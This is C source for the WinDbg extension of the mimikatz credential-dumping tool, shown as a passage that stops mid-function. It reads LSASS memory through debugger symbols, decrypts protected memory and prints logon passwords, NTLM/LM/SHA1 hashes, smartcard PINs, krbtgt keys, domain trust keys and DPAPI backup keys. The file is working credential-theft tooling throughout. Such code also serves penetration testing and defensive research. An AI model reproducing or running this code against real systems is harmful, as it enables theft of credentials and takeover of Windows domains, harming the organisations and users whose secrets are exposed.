/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kwindbg.h"

WINDBG_EXTENSION_APIS ExtensionApis = {0};
EXT_API_VERSION g_ExtApiVersion = {5 , 5 ,
#ifdef _M_X64
	EXT_API_VERSION_NUMBER64
#elif defined _M_IX86
	EXT_API_VERSION_NUMBER32
#endif
, 0};
USHORT NtBuildNumber = 0;

LPEXT_API_VERSION WDBGAPI ExtensionApiVersion (void)
{
	return &g_ExtApiVersion;
}

VOID CheckVersion(void)
{
	return;
}

VOID WDBGAPI WinDbgExtensionDllInit(PWINDBG_EXTENSION_APIS lpExtensionApis, USHORT usMajorVersion, USHORT usMinorVersion)
{
	ExtensionApis = *lpExtensionApis;
	NtBuildNumber = usMinorVersion;
	
	dprintf("\n"
		"  .#####.   " MIMIKATZ_FULL_A "\n"
		" .## ^ ##.  Windows build %hu\n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
		"  '#####'                                  WinDBG extension ! * * */\n\n"
		"===================================\n"
		"#         * Kernel mode *         #\n"
		"===================================\n"
		"# Search for LSASS process\n"
		"0: kd> !process 0 0 lsass.exe\n"
		"# Then switch to its context\n"
		"0: kd> .process /r /p <EPROCESS address>\n"
		"# And finally :\n"
		"0: kd> !mimikatz\n"
		"===================================\n"
		"#          * User mode *          #\n"
		"===================================\n"
		"0:000> !mimikatz\n"
		"===================================\n\n" , NtBuildNumber);
}

const char * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	"UndefinedLogonType", "Unknown !", "Interactive", "Network",
	"Batch", "Service", "Proxy", "Unlock", "NetworkCleartext",
	"NewCredentials", "RemoteInteractive", "CachedInteractive",
	"CachedRemoteInteractive", "CachedUnlock",
};

KUHL_M_SEKURLSA_PACKAGE packages[] = {
	{"msv",			NULL,									0, kuhl_m_sekurlsa_enum_logon_callback_msv},
	{"tspkg",		"tspkg!TSGlobalCredTable",				0, kuhl_m_sekurlsa_enum_logon_callback_tspkg},
	{"wdigest",		"wdigest!l_LogSessList",				0, kuhl_m_sekurlsa_enum_logon_callback_wdigest},
	{"livessp",		"livessp!LiveGlobalLogonSessionList",	0, kuhl_m_sekurlsa_enum_logon_callback_livessp},
	{"kerberos",	"kerberos!KerbGlobalLogonSessionTable",	0, kuhl_m_sekurlsa_enum_logon_callback_kerberos},
	{"ssp",			"msv1_0!SspCredentialList",				0, kuhl_m_sekurlsa_enum_logon_callback_ssp},
	{"masterkey",	"lsasrv!g_MasterKeyCacheList",			0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
	{"masterkey",	"dpapisrv!g_MasterKeyCacheList",		0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
	{"credman",		NULL,									0, kuhl_m_sekurlsa_enum_logon_callback_credman},
};

const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
};

DECLARE_API(mimikatz)
{
	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0, pDomainList = 0;
	PLIST_ENTRY LogonSessionList;
	ULONG LogonSessionListCount, i, j;
	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
	PBYTE buffer;
	DUAL_KRBTGT dualKrbtgt = {NULL, NULL};

	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_7)
		helper = &lsassEnumHelpers[0];
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
		helper = &lsassEnumHelpers[1];
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
		helper = &lsassEnumHelpers[3];
	else
		helper = &lsassEnumHelpers[4];

	if((NtBuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (GetExpression("lsasrv!LogonSessionLeakList")))
			helper++; // yeah, really, I do that =)

	pInitializationVector = GetExpression("lsasrv!InitializationVector");
	phAesKey = GetExpression("lsasrv!hAesKey");
	ph3DesKey = GetExpression("lsasrv!h3DesKey");

	pLogonSessionList = GetExpression("lsasrv!LogonSessionList");
	pLogonSessionListCount = GetExpression("lsasrv!LogonSessionListCount");

	for(j = 0; j < ARRAYSIZE(packages); j++)
		if(packages[j].symbolName)
			packages[j].symbolPtr = GetExpression(packages[j].symbolName);
	
	if(pSecData = GetExpression("kdcsvc!SecData"))
	{
		dprintf("\nkrbtgt keys\n===========\n");
		if(ReadMemory(pSecData + SECDATA_KRBTGT_OFFSET*sizeof(PVOID), &dualKrbtgt, 2*sizeof(PVOID), NULL))
		{
			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, "Current");
			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, "Previous");
		}
	}
#ifdef _M_X64
	if(pDomainList = GetExpression("kdcsvc!KdcDomainList"))
	{
		dprintf("\nDomain List\n===========\n");
		kuhl_m_sekurlsa_krbtgt_trust(pDomainList);
	}
#endif
	kuhl_sekurlsa_dpapi_backupkeys();

	dprintf("\nSekurLSA\n========\n");
	if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_init()))
	{
		if(pInitializationVector && phAesKey && ph3DesKey)
		{
			if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_acquireKeys(pInitializationVector, phAesKey, ph3DesKey)))
			{
				if(pLogonSessionListCount && pLogonSessionList)
				{
					if(ReadMemory(pLogonSessionListCount, &LogonSessionListCount, sizeof(ULONG), NULL))
					{
						if(LogonSessionList = (PLIST_ENTRY) LocalAlloc(LPTR, sizeof(LIST_ENTRY) * LogonSessionListCount))
						{
							if(ReadMemory(pLogonSessionList, LogonSessionList, sizeof(LIST_ENTRY) * LogonSessionListCount, NULL))
							{
								if(buffer = (PBYTE) LocalAlloc(LPTR, helper->tailleStruct))
								{
									for(i = 0; i < LogonSessionListCount; i++)
									{
										*(PVOID *) (buffer) = LogonSessionList[i].Flink;
										while(pLogonSessionList + (i * sizeof(LIST_ENTRY)) != (ULONG_PTR) *(PVOID *) (buffer))
										{
											if(ReadMemory((ULONG_PTR) *(PVOID *) (buffer), buffer, helper->tailleStruct, NULL))
											{
												sessionData.LogonId		= (PLUID)			(buffer + helper->offsetToLuid);
												sessionData.LogonType	= *((PULONG)		(buffer + helper->offsetToLogonType));
												sessionData.Session		= *((PULONG)		(buffer + helper->offsetToSession));
												sessionData.UserName	= (PUNICODE_STRING) (buffer + helper->offsetToUsername);
												sessionData.LogonDomain	= (PUNICODE_STRING) (buffer + helper->offsetToDomain);
												sessionData.pCredentials= *(PVOID *)		(buffer + helper->offsetToCredentials);
												sessionData.pSid		= *(PSID *)			(buffer + helper->offsetToPSid);
												sessionData.pCredentialManager = *(PVOID *) (buffer + helper->offsetToCredentialManager);
												sessionData.LogonTime	= *((PFILETIME)		(buffer + helper->offsetToLogonTime));
												sessionData.LogonServer	= (PUNICODE_STRING) (buffer + helper->offsetToLogonServer);

												if((sessionData.LogonType != Network) /*&& (sessionData.LogonType != UndefinedLogonType)*/)
												{
													kull_m_string_getDbgUnicodeString(sessionData.UserName);
													kull_m_string_getDbgUnicodeString(sessionData.LogonDomain);
													kull_m_string_getDbgUnicodeString(sessionData.LogonServer);
													kuhl_m_sekurlsa_utils_getSid(&sessionData.pSid);
													dprintf("\nAuthentication Id : %u ; %u (%08x:%08x)\n"
														"Session           : %s from %u\n"
														"User Name         : %wZ\n"
														"Domain            : %wZ\n"
														"Logon Server      : %wZ\n"
														, sessionData.LogonId->HighPart, sessionData.LogonId->LowPart, sessionData.LogonId->HighPart, sessionData.LogonId->LowPart
														, KUHL_M_SEKURLSA_LOGON_TYPE[sessionData.LogonType], sessionData.Session
														, sessionData.UserName, sessionData.LogonDomain, sessionData.LogonServer);
													
													dprintf("Logon Time        : ");
													kull_m_string_displayLocalFileTime(&sessionData.LogonTime);
													dprintf("\n");

													dprintf("SID               : ");
													if(sessionData.pSid)
														kull_m_string_displaySID(sessionData.pSid);
													dprintf("\n");

													LocalFree(sessionData.UserName->Buffer);
													LocalFree(sessionData.LogonDomain->Buffer);
													LocalFree(sessionData.LogonServer->Buffer);
													LocalFree(sessionData.pSid);

													for(j = 0; j < ARRAYSIZE(packages); j++)
														if(packages[j].symbolPtr || !packages[j].symbolName)
														{
															dprintf("\t%s : ", packages[j].name);
															packages[j].callback(packages[j].symbolPtr, &sessionData);
															dprintf("\n");
														}
												}
											}
											else break;
										}
									}
									LocalFree(buffer);
								}
							}
							LocalFree(LogonSessionList);
						}
					}
				} else dprintf("[ERROR] [LSA] Symbols\n%p - lsasrv!LogonSessionListCount\n%p - lsasrv!LogonSessionList\n", pLogonSessionListCount, pLogonSessionList);
			} else dprintf("[ERROR] [CRYPTO] Acquire keys");
		} else dprintf("[ERROR] [CRYPTO] Symbols\n%p - lsasrv!InitializationVector\n%p - lsasrv!hAesKey\n%p - lsasrv!h3DesKey\n", pInitializationVector, phAesKey, ph3DesKey);
		kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory();
	} else dprintf("[ERROR] [CRYPTO] Init\n");
}

UNICODE_STRING uNull = {12, 14, L"(null)"};
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
{
	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
	PMSV1_0_PRIMARY_CREDENTIAL_10 pPrimaryCreds10;
	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
	PKERB_HASHPASSWORD_6 pHashPassword;
	UNICODE_STRING buffer;
	PVOID base;
	DWORD type, i;
	BOOL isNull = FALSE;

	if(mesCreds)
	{
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
		{
			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
			credentials = (PUNICODE_STRING) mesCreds;
			if(credentials->Buffer)
			{
				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
					kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(((PUNICODE_STRING) mesCreds)->Buffer, ((PUNICODE_STRING) mesCreds)->Length);
				
				switch(type)
				{
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
					pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) credentials->Buffer;
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);

					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
					if(pPrimaryCreds->isLmOwfPassword)
					{
						dprintf("\n\t * LM       : ");
						kull_m_string_dprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds->isNtOwfPassword)
					{
						dprintf("\n\t * NTLM     : ");
						kull_m_string_dprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds->isShaOwPassword)
					{
						dprintf("\n\t * SHA1     : ");
						kull_m_string_dprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
					}
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10:
					pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) credentials->Buffer;
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->UserName, FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->LogonDomainName, FALSE);

					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds10->UserName, &pPrimaryCreds10->LogonDomainName);
					dprintf("\n\t * Flags    : I%02x/N%02x/L%02x/S%02x", pPrimaryCreds10->isIso, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword);
					if(!pPrimaryCreds10->isIso)
					{
						if(pPrimaryCreds10->isLmOwfPassword)
						{
							dprintf("\n\t * LM       : ");
							kull_m_string_dprintf_hex(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
						}
						if(pPrimaryCreds10->isNtOwfPassword)
						{
							dprintf("\n\t * NTLM     : ");
							kull_m_string_dprintf_hex(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
						}
						if(pPrimaryCreds10->isShaOwPassword)
						{
							dprintf("\n\t * SHA1     : ");
							kull_m_string_dprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
						}
					}
					else
						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) ((PBYTE) pPrimaryCreds10 + FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align0) + sizeof(USHORT)));
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base);
					break;
				default:
					dprintf("\n\t * Raw data : ");
					kull_m_string_dprintf_hex(credentials->Buffer, credentials->Length, 1);
				}
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
		{
			dprintf("\n\t * Smartcard"); 
			if(mesCreds->UserName.Buffer)
			{
				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
					dprintf("\n\t     PIN code : %wZ", &mesCreds->UserName);
					LocalFree(mesCreds->UserName.Buffer);
				}
			}
			if(mesCreds->Domaine.Buffer)
			{
				dprintf(
					"\n\t     Model    : %S"
					"\n\t     Reader   : %S"
					"\n\t     Key name : %S"
					"\n\t     Provider : %S",
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[0],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[1],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[2],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[3]
				);
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
		{
			pHashPassword = (PKERB_HASHPASSWORD_6) mesCreds;
			dprintf("\t   %s ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
			{
				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
				if(kull_m_string_getDbgUnicodeString(&buffer))
				{
					if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10) && (pHashPassword->Size > (DWORD) FIELD_OFFSET(LSAISO_DATA_BLOB, data)))
					{
						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) buffer.Buffer);
					}
					else
					{
						if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
							kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer.Buffer, buffer.MaximumLength);
						kull_m_string_dprintf_hex(buffer.Buffer, buffer.Length, 0);
					}
					LocalFree(buffer.Buffer);
				}
			}
			else dprintf("<no size, buffer is incorrect>");
			dprintf("\n");
		}
		else
		{
			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;

			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
			{
				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						username = &mesCreds->UserName;
					else
						domain = &mesCreds->UserName;
				}
				if(kull_m_string_getDbgUnicodeString(&mesCreds->Domaine) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						domain = &mesCreds->Domaine;
					else
						username = &mesCreds->Domaine;
				}
				if(kull_m_string_getDbgUnicodeString(&mesCreds->Password) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
					password = &mesCreds->Password;
				}

				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
				{
					dprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
						"%wZ\t%wZ\t"
						:
						"\n\t * Username : %wZ"
						"\n\t * Domain   : %wZ"
						"\n\t * Password : "
						, username ? username : &uNull, domain ? domain : &uNull);

					if(!password || kull_m_string_suspectUnicodeString(password))
					{
						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
							dprintf("%.*S", password->Length / sizeof(wchar_t), password->Buffer);
						else
							dprintf("%wZ", password ? password : &uNull);
					}
					else kull_m_string_dprintf_hex(password->Buffer, password->Length, 1);
				}

				if(username)
					LocalFree(username->Buffer);
				if(domain)
					LocalFree(domain->Buffer);
				if(password)
					LocalFree(password->Buffer);
			}
		}
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
			dprintf("\n");
	}
	else dprintf("LUID KO\n");
}

VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
{
	switch(key->unkId)
	{
	case 0x00010002:
	case 0x00010003:
		dprintf("\n\t * NTLM     : ");
		break;
	case 0x00020002:
		dprintf("\n\t * SHA1     : ");
		break;
	case 0x00030002:
	case 0x00030003:
		dprintf("\n\t * RootKey  : ");
		break;
	case 0x00040002:
	case 0x00040003:
		dprintf("\n\t * DPAPI    : ");
		break;
	default:
		dprintf("\n\t * %08x : ", key->unkId);
	}
	kull_m_string_dprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
	*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
}

VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
{
	dprintf("\n\t   * LSA Isolated Data: %.*s", blob->typeSize, blob->data);
	dprintf("\n\t     Unk-Key  : "); kull_m_string_dprintf_hex(blob->unkKeyData, 3*16, 0);
	dprintf("\n\t     Encrypted: "); kull_m_string_dprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
	//kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
	//kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
	//kull_m_string_wprintf_hex(blob->unkEmpty, 20, 0);
}

void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
{
	DWORD sizeForCreds, i;
	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	PVOID buffer;

	if(addr)
	{
		dprintf("\n%s krbtgt: ", prefix);
		if(ReadMemory((ULONG_PTR) addr, &tmpCred6, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6), NULL))
		{
			sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
			if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
			{
				if(ReadMemory((ULONG_PTR) addr, creds6, sizeForCreds, NULL))
				{
					dprintf("%u credentials\n", creds6->cbCred);
					for(i = 0; i < creds6->cbCred; i++)
					{
						dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
						if(buffer = LocalAlloc(LPTR, PtrToUlong(creds6->credentials[i].size)))
						{
							if(ReadMemory((ULONG_PTR) creds6->credentials[i].key, buffer, PtrToUlong(creds6->credentials[i].size), NULL))
								kull_m_string_dprintf_hex(buffer, PtrToUlong(creds6->credentials[i].size), 0);
							LocalFree(buffer);
						}
						dprintf("\n");
					}
				}
				LocalFree(creds6);
			}
		}
	}
}

#ifdef _M_X64
void kuhl_m_sekurlsa_krbtgt_trust(ULONG_PTR addr)
{
	ULONG_PTR buffer;
	KDC_DOMAIN_INFO domainInfo;

	if(ReadMemory(addr, &buffer, sizeof(ULONG_PTR), NULL))
	{
		while(buffer != addr)
		{
			if(ReadMemory(buffer, &domainInfo, sizeof(KDC_DOMAIN_INFO), NULL))
			{
				kuhl_m_sekurlsa_trust_domaininfo(&domainInfo);
				buffer = (ULONG_PTR) domainInfo.list.Flink;
			}
			else break;
		}
	}
}

void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCSTR prefix, BOOL incoming, PUNICODE_STRING domain)
{
	DWORD i;
	PKDC_DOMAIN_KEYS domainKeys;

	if((keysInfo->keysSize && keysInfo->keys) || (keysInfo->password.Length && keysInfo->password.Buffer))
	{
		dprintf("\n  [%s] ", prefix);
		dprintf(incoming ? "-> %wZ\n" : "%wZ ->\n", domain);

		if(kull_m_string_getDbgUnicodeString(&keysInfo->password))
		{
			dprintf("\tfrom: ");
			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
				dprintf("%wZ", &keysInfo->password);
			else kull_m_string_dprintf_hex(keysInfo->password.Buffer, keysInfo->password.Length, 1);
			LocalFree(keysInfo->password.Buffer);
		}
		dprintf("\n");

		if(keysInfo->keysSize && keysInfo->keys)
		{
			if(domainKeys = (PKDC_DOMAIN_KEYS) LocalAlloc(LPTR, keysInfo->keysSize))
			{
				if(ReadMemory((ULONG_PTR) keysInfo->keys, domainKeys, keysInfo->keysSize, NULL))
				{
					for(i = 0; i < domainKeys->nbKeys; i++)
					{
						dprintf("\t* %s : ", kuhl_m_kerberos_ticket_etype(domainKeys->keys[i].type));
						kull_m_string_dprintf_hex((PBYTE) domainKeys + domainKeys->keys[i].offset, domainKeys->keys[i].size, 0);
						dprintf("\n");
					}
				}
				LocalFree(domainKeys);
			}
		}
	}
}

void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
{
	if(kull_m_string_getDbgUnicodeString(&info->FullDomainName))
	{
		if(kull_m_string_getDbgUnicodeString(&info->NetBiosName))
		{
			dprintf("\nDomain: %wZ (%wZ", &info->FullDomainName, &info->NetBiosName);
			if(kuhl_m_sekurlsa_utils_getSid(&info->DomainSid))
			{
				dprintf(" / "); kull_m_string_displaySID(info->DomainSid);
				LocalFree(info->DomainSid);
			}
			dprintf(")\n");
			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingAuthenticationKeys, " Out ", FALSE, &info->FullDomainName);	// Input keys are for Out relation ship...
			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingAuthenticationKeys, "  In ", TRUE, &info->FullDomainName);
			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingPreviousAuthenticationKeys, "Out-1", FALSE, &info->FullDomainName);
			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingPreviousAuthenticationKeys, " In-1", TRUE, &info->FullDomainName);
			LocalFree(info->NetBiosName.Buffer);
		}
		LocalFree(info->FullDomainName.Buffer);
	}
}
#endif

void kuhl_sekurlsa_dpapi_display_backupkey(ULONG_PTR pGuid, ULONG_PTR pPb, ULONG_PTR pCb, PCSTR text)
{
	GUID guid;
	DWORD cb, szPVK;
	PVOID tmpPtr;
	PKIWI_BACKUP_KEY buffer;
	PVK_FILE_HDR pvkHeader = {PVK_MAGIC, PVK_FILE_VERSION_0, AT_KEYEXCHANGE, PVK_NO_ENCRYPT, 0, 0};
